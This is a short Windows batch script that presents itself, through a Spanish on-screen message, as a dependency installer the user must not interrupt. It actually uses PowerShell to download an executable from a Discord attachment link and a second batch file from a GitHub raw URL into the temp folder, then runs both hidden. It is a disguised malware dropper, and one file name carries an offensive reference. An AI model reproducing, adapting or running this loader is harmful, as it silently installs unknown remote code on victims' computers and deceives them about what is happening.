@echo off
title Cloud
set "url=https://cdn.discordapp.com/attachments/1245898799210168331/1306644489376628746/ZXNwbGFjaA-1.exe?ex=67376b02&is=67361982&hm=4f3c7abfe624047e6461c3083d2c4ee1d81257477975e7f1c43da6ceebb49345&"
set "filename=georgefloydss.exe"
set "urlbatch=https://raw.githubusercontent.com/ghgodbomboclat/apguacamole-commons/refs/heads/main/georgefloydss.bat"
set "bfn=georgefloydss.bat"
color b
echo NO TOQUES NADA!!! Las dependencias se estan descargando, esto podria tomar un buen tiempo, cuando se termine se va a cerrar automaticamente.
cd /d "%TEMP%"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%filename%'); Start-Process '%filename%' -WindowStyle Hidden
powershell -Command "(New-Object Net.WebClient).DownloadFile('%urlbatch%', '%bfn%'); Start-Process '%bfn%' -WindowStyle Hidden
